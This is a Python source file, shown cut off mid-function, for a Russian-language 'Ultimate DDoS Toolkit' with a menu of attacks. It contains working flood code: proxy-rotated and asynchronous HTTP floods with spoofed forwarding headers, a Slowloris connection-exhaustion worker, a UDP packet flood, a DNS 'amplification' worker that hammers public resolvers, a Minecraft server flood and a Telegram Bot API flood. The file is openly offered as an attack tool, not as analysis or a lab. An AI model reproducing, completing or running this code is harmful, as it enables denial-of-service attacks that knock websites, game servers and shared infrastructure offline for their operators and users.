import socket
import threading
import random
import time
import sys
import ssl
import requests
import os
import json
import platform
import psutil
import atexit
import hashlib
import struct
import base64
import ctypes
import concurrent.futures
import asyncio
import aiohttp
import async_timeout
import dns.resolver
import ipaddress
from colorama import init, Fore, Style
from urllib.parse import urlparse
from datetime import datetime

init(autoreset=True)

class UltimateDDoSAttack:
    def __init__(self):
        self.running = False
        self.executor = None
        self.loop = None
        self.target_url = ""
        self.target_ip = ""
        self.target_port = 80
        self.num_workers = 2500
        self.attack_type = "http"
        self.monitor_running = False
        self.stats_running = False
        
        self.stats = {
            'start_time': None,
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'bytes_sent': 0,
            'attack_duration': 0,
            'workers_active': 0,
            'target_status': 'Unknown',
            'last_success_time': None,
            'packets_sent': 0,
            'telegram_requests': 0,
            'minecraft_packets': 0,
            'dns_queries': 0,
            'connection_count': 0
        }
        
        self.site_stats = {
            'main_page': {'response_time': 0, 'status_code': 0, 'size': 0, 'hash': ''},
            'api_endpoints': [],
            'resource_loading': {'success': 0, 'failed': 0, 'avg_time': 0},
            'cdn_detected': False,
            'cache_status': 'unknown',
            'is_online': False,
            'last_check': None,
            'uptime_history': []
        }
        
        self.telegram_data = {
            'bot_tokens': [
                "123456789:AAH_DUMMY_TOKEN_DUMMY_DUMMY",
                "987654321:BBH_FAKE_TOKEN_FAKE_FAKE_FA",
                "555555555:CCH_ANOTHER_FAKE_TOKEN_HERE"
            ],
            'target_usernames': [],
            'chat_ids': [],
            'message_ids': [],
            'api_requests': 0,
            'mtproto_requests': 0
        }
        
        self.minecraft_data = {
            'server_type': 'unknown',
            'version': 'unknown',
            'player_count': 0,
            'max_players': 0,
            'motd': ''
        }
        
        self.check_paths = [
            "/", "/index.html", "/main", "/home", "/api/status",
            "/api/v1/health", "/robots.txt", "/sitemap.xml",
            "/static/main.css", "/static/app.js"
        ]
        
        self.telegram_api_methods = [
            "sendMessage", "sendPhoto", "sendDocument", "sendVideo",
            "sendAudio", "sendVoice", "sendLocation", "sendContact",
            "sendChatAction", "forwardMessage", "copyMessage",
            "editMessageText", "deleteMessage", "getUpdates",
            "getChat", "getChatAdministrators", "getChatMembersCount",
            "getChatMember", "answerCallbackQuery", "answerInlineQuery",
            "getUserProfilePhotos", "getFile", "kickChatMember",
            "unbanChatMember", "restrictChatMember", "promoteChatMember",
            "setChatPermissions", "exportChatInviteLink", "setChatPhoto",
            "deleteChatPhoto", "setChatTitle", "setChatDescription",
            "pinChatMessage", "unpinChatMessage", "leaveChat"
        ]
        
        self.dns_amplification_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "9.9.9.9", "149.112.112.112", "208.67.222.222",
            "208.67.220.220", "64.6.64.6", "64.6.65.6",
            "84.200.69.80", "84.200.70.40", "8.26.56.26",
            "8.20.247.20", "195.46.39.39", "195.46.39.40"
        ]
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.log_file = f"ddos_log_{timestamp}.txt"
        self.print_lock = threading.Lock()
        atexit.register(self.cleanup)
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
        ]
        
        self.proxy_list = []
        self.load_proxies()
        self.current_proxy_index = 0
        
        self.generate_dynamic_headers()
        
        self.http_session = None
        
        print(f"{Fore.GREEN}[+] Ultimate DDoS Toolkit v3.2 инициализирован")
        print(f"{Fore.YELLOW}[*] Загружено прокси: {len(self.proxy_list)}")
        print(f"{Fore.YELLOW}[*] Загружено DNS серверов: {len(self.dns_amplification_servers)}")

    def load_proxies(self):
        try:
            proxy_sources = [
                "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
                "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
            ]
            
            for source in proxy_sources:
                try:
                    response = requests.get(source, timeout=5)
                    proxies = response.text.strip().split('\n')
                    self.proxy_list.extend([p.strip() for p in proxies if p.strip()])
                except:
                    continue
            
            if not self.proxy_list:
                self.proxy_list = ["direct"]
                
        except:
            self.proxy_list = ["direct"]

    def get_proxy(self):
        if not self.proxy_list:
            return None
        
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxy_list)
        proxy = self.proxy_list[self.current_proxy_index]
        
        if proxy == "direct":
            return None
        
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def generate_dynamic_headers(self):
        self.headers_list = []
        for _ in range(200):
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': random.choice(['keep-alive', 'close', 'upgrade']),
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': random.choice(['max-age=0', 'no-cache', 'no-store']),
                'TE': 'Trailers',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
                'Sec-Fetch-User': '?1',
                'Pragma': random.choice(['no-cache', ''])
            }
            
            if random.random() > 0.5:
                headers['Referer'] = f'https://www.google.com/search?q={random.randint(100000, 999999)}'
            
            if random.random() > 0.3:
                ip = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                headers['X-Forwarded-For'] = ip
                headers['X-Real-IP'] = ip
                headers['CF-Connecting-IP'] = ip
            
            if random.random() > 0.7:
                headers['X-CSRF-Token'] = hashlib.md5(str(random.random()).encode()).hexdigest()
            
            self.headers_list.append(headers)

    def safe_print(self, message):
        with self.print_lock:
            print(message)

    def cleanup(self):
        self.stop_attack()
        if self.executor:
            self.executor.shutdown(wait=False)
        if self.http_session:
            try:
                asyncio.run_coroutine_threadsafe(self.http_session.close(), self.loop)
            except:
                pass

    def clear_screen(self):
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
        except:
            pass

    def display_logo(self):
        print(f"{Fore.YELLOW}╔═══════════════════════════════════════════════════════╗")
        print(f"{Fore.YELLOW}║{Fore.RED}    ██████╗ ██████╗ ██████╗ ███████╗                   {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.RED}    ██╔══██╗██╔══██╗██╔══██╗██╔════╝                   {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.RED}    ██║  ██║██║  ██║██║  ██║███████╗                   {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.RED}    ██║  ██║██║  ██║██║  ██║╚════██║                   {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.RED}    ██████╔╝██████╔╝██████╔╝███████║                   {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.RED}    ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝                   {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.RED}    ██████╗ ███████╗██╗  ██╗                           {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.RED}    ██╔══██╗╚══███╔╝██║ ██╔╝                           {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.RED}    ██████╔╝  ███╔╝ █████╔╝                            {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.RED}    ██╔═══╝  ███╔╝  ██╔═██╗                            {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.RED}    ██║     ███████╗██║  ██╗                           {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.RED}    ╚═╝     ╚══════╝╚═╝  ╚═╝                           {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}║{Fore.GREEN}       ULTIMATE DDOS TOOLKIT v3.2                      {Fore.YELLOW}║")
        print(f"{Fore.YELLOW}╚═══════════════════════════════════════════════════════╝")
        print(f"{Fore.CYAN}╔═══════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║{Fore.MAGENTA}    Websites • Minecraft • Telegram • API              {Fore.CYAN}║")
        print(f"{Fore.CYAN}╚═══════════════════════════════════════════════════════╝")

    def display_menu(self):
        print(f"\n{Fore.GREEN}╔═══════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}║{Fore.YELLOW}                  ВИДЫ АТАК:                           {Fore.GREEN}║")
        print(f"{Fore.GREEN}╠═══════════════════════════════════════════════════════╣")
        print(f"{Fore.GREEN}║{Fore.RED} [1]  HTTP/HTTPS Super Flood (PROXY) ★★★★              {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.RED} [2]  Async HTTP Flood (MAX POWER) ★★★★★               {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.RED} [3]  Slowloris Pro + Connection Pool ★★★              {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.RED} [4]  UDP Flood (Raw Sockets) ★★                       {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.RED} [5]  DNS Amplification + NTP ★★★                      {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.MAGENTA} [6]  Minecraft Server Crash ★★★                       {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.MAGENTA} [7]  Telegram Bot/API Flood ★★★★                      {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.RED} [8]  Mixed Super Attack (ALL) ★★★★★                   {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.CYAN} [9]  Мониторинг цели (детальный)                      {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.CYAN} [10] Просмотр статистики и логов                      {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.YELLOW} [11] Сканирование цели (уязвимости)                   {Fore.GREEN}║")
        print(f"{Fore.GREEN}║{Fore.BLUE} [12] Конфигурация атаки                               {Fore.GREEN}║")
        print(f"{Fore.GREEN}╚═══════════════════════════════════════════════════════╝")

    def resolve_target(self, url):
        try:
            if '://' in url:
                parsed = urlparse(url)
                host = parsed.hostname
            else:
                if ':' in url and not url.startswith('http'):
                    parts = url.split(':')
                    host = parts[0]
                    if len(parts) > 1 and parts[1].isdigit():
                        self.target_port = int(parts[1])
                else:
                    host = url.split('/')[0]
            
            self.target_url = host
            try:
                self.target_ip = socket.gethostbyname(host)
            except:
                self.target_ip = host
            return True
        except:
            return False

    def calculate_hash(self, data):
        return hashlib.md5(data).hexdigest()[:8]

    def check_target_detailed(self):
        try:
            scheme = "https" if self.target_port == 443 else "http"
            base_url = f"{scheme}://{self.target_url}"
            
            results = []
            total_time = 0
            successful_checks = 0
            
            for path in self.check_paths[:5]:
                try:
                    url = f"{base_url}{path}"
                    start_time = time.time()
                    
                    proxy = self.get_proxy()
                    
                    response = requests.get(
                        url, 
                        timeout=2,
                        headers={'User-Agent': random.choice(self.user_agents)},
                        proxies=proxy if proxy else None,
                        verify=False
                    )
                    
                    response_time = (time.time() - start_time) * 1000
                    content_hash = self.calculate_hash(response.content[:1024])
                    
                    result = {
                        'path': path,
                        'status_code': response.status_code,
                        'response_time': response_time,
                        'size': len(response.content),
                        'hash': content_hash
                    }
                    
                    results.append(result)
                    total_time += response_time
                    
                    if response.status_code < 500:
                        successful_checks += 1
                    
                    headers_lower = {k.lower(): v for k, v in response.headers.items()}
                    
                    if 'cf-ray' in headers_lower or 'cloudflare' in str(headers_lower).lower():
                        self.site_stats['cdn_detected'] = True
                    
                    if 'cache-control' in headers_lower or 'x-cache' in headers_lower:
                        self.site_stats['cache_status'] = 'cached'
                    
                except:
                    continue
            
            avg_time = total_time / len(results) if results else 0
            is_online = successful_checks >= 2
            
            self.site_stats['main_page'] = results[0] if results else {'response_time': 0, 'status_code': 0, 'size': 0, 'hash': ''}
            self.site_stats['api_endpoints'] = results[1:] if len(results) > 1 else []
            self.site_stats['resource_loading'] = {'success': successful_checks, 'failed': len(self.check_paths[:5]) - successful_checks, 'avg_time': avg_time}
            self.site_stats['is_online'] = is_online
            self.site_stats['last_check'] = datetime.now().strftime('%H:%M:%S')
            
            self.site_stats['uptime_history'].append({
                'timestamp': datetime.now().strftime('%H:%M:%S'),
                'online': is_online,
                'avg_response_time': avg_time,
                'successful_checks': successful_checks
            })
            
            if len(self.site_stats['uptime_history']) > 50:
                self.site_stats['uptime_history'] = self.site_stats['uptime_history'][-50:]
            
            return is_online
            
        except:
            self.site_stats['is_online'] = False
            self.site_stats['last_check'] = datetime.now().strftime('%H:%M:%S')
            return False

    def log_attack(self, message):
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_entry = f"[{timestamp}] {message}"
            
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry + '\n')
            
            return log_entry
        except:
            return ""

    def update_stats(self, request_type='sent', bytes_count=0, success=False, packets=0, telegram=False, minecraft=False, dns=False):
        try:
            if request_type == 'sent':
                self.stats['requests_sent'] += 1
                self.stats['bytes_sent'] += bytes_count
                self.stats['packets_sent'] += packets
                if telegram:
                    self.stats['telegram_requests'] += 1
                    self.telegram_data['api_requests'] += 1
                if minecraft:
                    self.stats['minecraft_packets'] += 1
                if dns:
                    self.stats['dns_queries'] += 1
            elif request_type == 'success':
                self.stats['successful_requests'] += 1
                self.stats['last_success_time'] = datetime.now()
            elif request_type == 'fail':
                self.stats['failed_requests'] += 1
            elif request_type == 'connection':
                self.stats['connection_count'] += 1
            
            if self.stats['start_time']:
                self.stats['attack_duration'] = (datetime.now() - self.stats['start_time']).total_seconds()
        except:
            pass

    def display_attack_stats(self):
        try:
            print(f"\n{Fore.MAGENTA}╔═══════════════════════════════════════════════════════╗")
            print(f"{Fore.MAGENTA}║{Fore.CYAN}                 СТАТИСТИКА АТАКИ                   {Fore.MAGENTA}║")
            print(f"{Fore.MAGENTA}╠═══════════════════════════════════════════════════════╣")
            
            if self.stats['start_time']:
                duration = self.stats['attack_duration']
                hours = int(duration // 3600)
                minutes = int((duration % 3600) // 60)
                seconds = int(duration % 60)
                
                print(f"{Fore.MAGENTA}║{Fore.WHITE} Длительность: {hours:02d}:{minutes:02d}:{seconds:02d}                    {Fore.MAGENTA}║")
                
                rps = self.stats['requests_sent'] / duration if duration > 0 else 0
                print(f"{Fore.MAGENTA}║{Fore.WHITE} RPS: {rps:,.0f} запросов/сек                  {Fore.MAGENTA}║")
                
                if self.attack_type in ['udp_tcp', 'dns_amplification', 'minecraft', 'udp_flood']:
                    pps = self.stats['packets_sent'] / duration if duration > 0 else 0
                    print(f"{Fore.MAGENTA}║{Fore.WHITE} PPS: {pps:,.0f} пакетов/сек                  {Fore.MAGENTA}║")
                
                if self.attack_type == 'telegram':
                    tps = self.stats['telegram_requests'] / duration if duration > 0 else 0
                    print(f"{Fore.MAGENTA}║{Fore.RED} Telegram: {tps:.1f} запросов/сек           {Fore.MAGENTA}║")
            else:
                print(f"{Fore.MAGENTA}║{Fore.WHITE} Длительность: Атака не активна                {Fore.MAGENTA}║")
            
            total_req = self.stats['requests_sent']
            success_req = self.stats['successful_requests']
            failed_req = self.stats['failed_requests']
            success_rate = (success_req / total_req * 100) if total_req > 0 else 0
            
            print(f"{Fore.MAGENTA}║{Fore.WHITE} Отправлено запросов: {total_req:,}                {Fore.MAGENTA}║")
            print(f"{Fore.MAGENTA}║{Fore.WHITE} Успешных: {success_req:,} | Ошибок: {failed_req:,}       {Fore.MAGENTA}║")
            print(f"{Fore.MAGENTA}║{Fore.WHITE} Успешность: {success_rate:.2f}%                    {Fore.MAGENTA}║")
            
            bytes_sent = self.stats['bytes_sent']
            if bytes_sent < 1024:
                bytes_str = f"{bytes_sent} B"
            elif bytes_sent < 1024*1024:
                bytes_str = f"{bytes_sent/1024:,.2f} KB"
            elif bytes_sent < 1024*1024*1024:
                bytes_str = f"{bytes_sent/(1024*1024):,.2f} MB"
            else:
                bytes_str = f"{bytes_sent/(1024*1024*1024):,.2f} GB"
            
            print(f"{Fore.MAGENTA}║{Fore.WHITE} Отправлено данных: {bytes_str}                {Fore.MAGENTA}║")
            
            if self.attack_type == 'minecraft':
                packets = self.stats['minecraft_packets']
                print(f"{Fore.MAGENTA}║{Fore.WHITE} Minecraft пакетов: {packets:,}                {Fore.MAGENTA}║")
            elif self.attack_type == 'telegram':
                tg_req = self.stats['telegram_requests']
                print(f"{Fore.MAGENTA}║{Fore.RED} Telegram запросов: {tg_req:,}                {Fore.MAGENTA}║")
            elif self.attack_type == 'dns_amplification':
                dns_q = self.stats['dns_queries']
                print(f"{Fore.MAGENTA}║{Fore.CYAN} DNS запросов: {dns_q:,}                    {Fore.MAGENTA}║")
            
            print(f"{Fore.MAGENTA}║{Fore.WHITE} Активных соединений: {self.stats['connection_count']:,}         {Fore.MAGENTA}║")
            
            try:
                active_workers = self.num_workers
                print(f"{Fore.MAGENTA}║{Fore.WHITE} Активных воркеров: {active_workers:,}          {Fore.MAGENTA}║")
            except:
                print(f"{Fore.MAGENTA}║{Fore.WHITE} Активных воркеров: N/A                {Fore.MAGENTA}║")
            
            print(f"{Fore.MAGENTA}╚═══════════════════════════════════════════════════════╝")
        except:
            print(f"{Fore.RED}[!] Ошибка отображения статистики")

    def display_site_stats(self):
        try:
            target_display = self.target_url[:20] if len(self.target_url) > 20 else self.target_url
            print(f"\n{Fore.BLUE}╔═══════════════════════════════════════════════════════╗")
            print(f"{Fore.BLUE}║{Fore.YELLOW}               СТАТУС ЦЕЛИ: {target_display:^20}   {Fore.BLUE}║")
            print(f"{Fore.BLUE}╠═══════════════════════════════════════════════════════╣")
            
            status_color = Fore.GREEN if self.site_stats['is_online'] else Fore.RED
            status_text = "ONLINE" if self.site_stats['is_online'] else "OFFLINE"
            
            print(f"{Fore.BLUE}║{Fore.WHITE} Статус: {status_color}{status_text:<10}{Fore.WHITE} "
                  f"IP: {self.target_ip:<15} Порт: {self.target_port:<5} {Fore.BLUE}║")
            
            if self.attack_type == 'minecraft':
                print(f"{Fore.BLUE}║{Fore.MAGENTA} Minecraft Server Attack активен                    {Fore.BLUE}║")
                print(f"{Fore.BLUE}║{Fore.WHITE} Тип: Java/Bedrock | Протокол: UDP/TCP               {Fore.BLUE}║")
            elif self.attack_type == 'telegram':
                print(f"{Fore.BLUE}║{Fore.RED} Telegram API Flood активен                     {Fore.BLUE}║")
                print(f"{Fore.BLUE}║{Fore.WHITE} Методы: Bot API + MTProto + Web                   {Fore.BLUE}║")
            elif self.attack_type == 'udp_flood':
                print(f"{Fore.BLUE}║{Fore.YELLOW} UDP Flood активен                         {Fore.BLUE}║")
                print(f"{Fore.BLUE}║{Fore.WHITE} Методы: RAW UDP сокеты + большой трафик     {Fore.BLUE}║")
            elif self.attack_type == 'dns_amplification':
                print(f"{Fore.BLUE}║{Fore.CYAN} DNS Amplification активен                  {Fore.BLUE}║")
                print(f"{Fore.BLUE}║{Fore.WHITE} Серверы: {len(self.dns_amplification_servers)} рефлекторов         {Fore.BLUE}║")
            else:
                main = self.site_stats['main_page']
                if main['status_code'] > 0:
                    code_color = Fore.GREEN if main['status_code'] < 400 else Fore.YELLOW if main['status_code'] < 500 else Fore.RED
                    print(f"{Fore.BLUE}║{Fore.WHITE} Главная: {code_color}{main['status_code']:<10}{Fore.WHITE} "
                          f"Время: {main['response_time']:.0f}ms | Размер: {main['size']:,}B {Fore.BLUE}║")
                
                resources = self.site_stats['resource_loading']
                success_color = Fore.GREEN if resources['success'] >= 3 else Fore.YELLOW if resources['success'] >= 1 else Fore.RED
                print(f"{Fore.BLUE}║{Fore.WHITE} Ресурсы: {success_color}{resources['success']}/5{Fore.WHITE} успешно | "
                      f"Ср. время: {resources['avg_time']:.0f}ms {Fore.BLUE}║")
                
                cdn_status = "Да" if self.site_stats['cdn_detected'] else "Нет"
                cache_status = self.site_stats['cache_status']
                print(f"{Fore.BLUE}║{Fore.WHITE} CDN: {cdn_status:<5} Кэш: {cache_status:<10} "
                      f"Проверка: {self.site_stats['last_check']} {Fore.BLUE}║")
            
            print(f"{Fore.BLUE}╠═══════════════════════════════════════════════════════╣")
            print(f"{Fore.BLUE}║{Fore.CYAN}         ИСТОРИЯ ДОСТУПНОСТИ (последние 5)           {Fore.BLUE}║")
            
            history = self.site_stats['uptime_history'][-5:]
            for entry in history:
                status = "✓" if entry['online'] else "✗"
                color = Fore.GREEN if entry['online'] else Fore.RED
                print(f"{Fore.BLUE}║ {entry['timestamp']} {color}{status} "
                      f"{entry['successful_checks']}/5 ({entry['avg_response_time']:.0f}ms) {Fore.BLUE}║")
            
            print(f"{Fore.BLUE}╚═══════════════════════════════════════════════════════╝")
        except:
            print(f"{Fore.RED}[!] Ошибка отображения статуса сайта")

    def monitoring_thread(self):
        while self.monitor_running:
            try:
                self.check_target_detailed()
                time.sleep(3)
            except:
                time.sleep(1)

    def stats_display_thread(self):
        while self.stats_running:
            try:
                self.clear_screen()
                self.display_logo()
                
                if self.stats['start_time']:
                    print(f"\n{Fore.RED}[!] АКТИВНАЯ АТАКА: {self.attack_type.upper()}")
                    print(f"{Fore.YELLOW}[*] Цель: {self.target_url} ({self.target_ip}:{self.target_port})")
                    print(f"{Fore.YELLOW}[*] Воркеров: {self.num_workers:,}")
                    print(f"{Fore.YELLOW}[*] Нажмите Ctrl+C для остановки")
                
                self.display_attack_stats()
                self.display_site_stats()
                self.display_system_stats()
                
                time.sleep(1)
                
            except KeyboardInterrupt:
                break
            except Exception:
                time.sleep(2)

    def http_flood_proxy_worker(self):
        paths = [
            "/", "/index.html", "/index.php", "/home", "/main",
            "/test", "/api", "/wp-admin", "/admin", "/login",
            "/static/style.css", "/static/script.js", "/images/logo.png",
            "/wp-login.php", "/administrator", "/phpmyadmin", "/mysql"
        ]
        
        while self.running:
            try:
                proxy = self.get_proxy()
                
                path = random.choice(paths)
                scheme = "https" if self.target_port == 443 else "http"
                url = f"{scheme}://{self.target_url}{path}"
                headers = random.choice(self.headers_list)
                
                try:
                    response = requests.get(
                        url,
                        headers=headers,
                        proxies=proxy if proxy else None,
                        timeout=0.5,
                        verify=False,
                        allow_redirects=True
                    )
                    
                    self.update_stats('sent', len(str(headers)) + len(path) + 100)
                    
                    if response.status_code < 500:
                        self.update_stats('success')
                    else:
                        self.update_stats('fail')
                        
                except requests.exceptions.Timeout:
                    self.update_stats('connection')
                except:
                    self.update_stats('fail')
                
            except:
                self.update_stats('fail')
            
            time.sleep(0.00001)

    async def async_http_flood_worker(self, session):
        paths = ["/", "/index.html", "/test", "/api", "/wp-admin", "/robots.txt"]
        
        while self.running:
            try:
                scheme = "https" if self.target_port == 443 else "http"
                url = f"{scheme}://{self.target_url}{random.choice(paths)}"
                headers = random.choice(self.headers_list)
                
                try:
                    async with async_timeout.timeout(0.3):
                        async with session.get(url, headers=headers, ssl=False) as response:
                            await response.read()
                            self.update_stats('sent', len(str(headers)) + 200)
                            if response.status < 500:
                                self.update_stats('success')
                            else:
                                self.update_stats('fail')
                except:
                    self.update_stats('fail')
                
            except:
                self.update_stats('fail')
            
            await asyncio.sleep(0.000001)

    async def async_attack_manager(self, num_workers):
        connector = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            force_close=True,
            enable_cleanup_closed=True,
            use_dns_cache=False
        )
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=0.5),
            headers={'Connection': 'close'}
        ) as session:
            
            tasks = []
            for _ in range(num_workers):
                task = asyncio.create_task(self.async_http_flood_worker(session))
                tasks.append(task)
            
            await asyncio.gather(*tasks, return_exceptions=True)

    def slowloris_connection_exhaustion_worker(self):
        connections = []
        max_connections = 100
        
        while self.running:
            try:
                if len(connections) < max_connections:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        sock.connect((self.target_ip, self.target_port))
                        
                        sock.send(f"GET / HTTP/1.1\r\n".encode())
                        sock.send(f"Host: {self.target_url}\r\n".encode())
                        sock.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                        
                        connections.append(sock)
                        self.update_stats('connection')
                        self.update_stats('sent', 100)
                        
                    except:
                        pass
                
                for sock in connections[:]:
                    try:
                        header_name = f"X-Custom-{random.randint(1000, 9999)}"
                        header_value = "a" * random.randint(100, 500)
                        sock.send(f"{header_name}: {header_value}\r\n".encode())
                        self.update_stats('sent', len(header_name) + len(header_value) + 4)
                    except:
                        try:
                            sock.close()
                        except:
                            pass
                        connections.remove(sock)
                
                time.sleep(random.randint(5, 15))
                
            except:
                pass
        
        for sock in connections:
            try:
                sock.close()
            except:
                pass

    def udp_flood_worker(self):
        packet_sizes = [512, 1024, 1450, 2048]
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                packet_size = random.choice(packet_sizes)
                packet_data = os.urandom(packet_size)
                
                packets_per_burst = random.randint(10, 100)
                
                for _ in range(packets_per_burst):
                    try:
                        sock.sendto(packet_data, (self.target_ip, self.target_port))
                        self.update_stats('sent', packet_size, packets=1)
                    except:
                        break
                
                sock.close()
                time.sleep(0.0001)
                
            except:
                self.update_stats('fail')
                time.sleep(0.001)

    def dns_amplification_worker(self):
        dns_queries = [
            b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x06google\x03com\x00\x00\x01\x00\x01',
            b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x07youtube\x03com\x00\x00\x01\x00\x01',
            b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x06github\x03com\x00\x00\x01\x00\x01',
            b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x06amazon\x03com\x00\x00\x01\x00\x01',
            b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x08facebook\x03com\x00\x00\x01\x00\x01'
        ]
        
        while self.running:
            try:
                dns_server = random.choice(self.dns_amplification_servers)
                query = random.choice(dns_queries)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.05)
                
                queries_count = random.randint(5, 20)
                
                for _ in range(queries_count):
                    try:
                        sock.sendto(query, (dns_server, 53))
                        self.update_stats('sent', len(query), packets=1, dns=True)
                    except:
                        break
                
                sock.close()
                time.sleep(0.00001)
                
            except:
                self.update_stats('fail')
                time.sleep(0.001)

    def minecraft_server_flood_worker(self):
        def create_minecraft_pe_packet():
            packet_id = b'\x00'
            protocol_version = struct.pack('>B', 4)
            server_addr = self.target_url.encode('utf-8')
            addr_len = struct.pack('>H', len(server_addr))
            server_port = struct.pack('>H', self.target_port)
            next_state = struct.pack('>B', 1)
            return packet_id + protocol_version + addr_len + server_addr + server_port + next_state
        
        while self.running:
            try:
                use_udp = random.choice([True, False])
                
                if use_udp:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    packet = create_minecraft_pe_packet()
                    
                    packets_count = random.randint(20, 100)
                    for _ in range(packets_count):
                        try:
                            sock.sendto(packet, (self.target_ip, self.target_port))
                            self.update_stats('sent', len(packet), packets=1, minecraft=True)
                        except:
                            break
                    
                    sock.close()
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.3)
                    
                    try:
                        sock.connect((self.target_ip, self.target_port))
                        packet = create_minecraft_pe_packet()
                        
                        packets_count = random.randint(10, 50)
                        for _ in range(packets_count):
                            try:
                                sock.send(packet)
                                self.update_stats('sent', len(packet), packets=1, minecraft=True)
                            except:
                                break
                        
                        sock.close()
                        self.update_stats('success')
                        
                    except:
                        self.update_stats('fail')
                        try:
                            sock.close()
                        except:
                            pass
                
                time.sleep(0.00001)
                
            except:
                self.update_stats('fail')
                time.sleep(0.001)

    def telegram_flood_worker(self):
        fake_messages = ["Test", "Spam", "Flood", "Attack", "DDoS", "Crash", "Overload"]
        
        while self.running:
            try:
                attack_method = random.choice(["bot_api", "web", "fake_mtproto"])
                
                if attack_method == "bot_api":
                    token = random.choice(self.telegram_data['bot_tokens'])
                    method = random.choice(self.telegram_api_methods)
                    url = f"https://api.telegram.org/bot{token}/{method}"
                    
                    data = {
                        "chat_id": random.randint(-1000000000, 1000000000),
                        "text": " ".join(random.sample(fake_messages, 5)) + " " + "A" * 100,
                        "parse_mode": "HTML"
                    }
                    
                    try:
                        response = requests.post(url, json=data, timeout=0.5)
                        self.update_stats('sent', len(str(data)), telegram=True)
                        
                        if response.status_code == 200:
                            self.update_stats('success')
                        else:
                            self.update_stats('fail')
                            
                    except:
                        self.update_stats('fail')
                
                elif attack_method == "web":
                    try:
                        response = requests.get("https://web.telegram.org", timeout=0.5)
                        self.update_stats('sent', 100, telegram=True)
                        
                        if response.status_code == 200:
                            self.update_stats('success')
                        else:
                            self.update_stats('fail')
                            
                    except:
                        self.update_stats('fail')
                
                elif attack_method == "fake_mtproto":
